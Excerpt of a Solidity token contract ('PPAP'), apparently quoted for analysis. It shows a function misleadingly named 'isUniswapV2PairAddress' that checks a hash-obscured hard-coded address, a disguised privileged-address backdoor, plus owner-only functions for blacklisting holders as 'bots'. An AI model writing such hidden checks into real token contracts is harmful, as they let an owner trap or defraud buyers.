...
library Address {
    function isUniswapV2PairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0xf03481b57b27af861ae31b6d07be8e6665439d9a4a98dcad0fb8711b04d0f6dd;
    }
}
...
contract PPAP is Ownable, IERC20 {
    ...
    string private _name = "Apple pen, Pineapple pen, Ugh! Pen Pineapple Apple Pen";
    ...
    function addBot(address a) external onlyOwner {bots[a] = true;}
    function delBot(address a) external onlyOwner {bots[a] = false;}
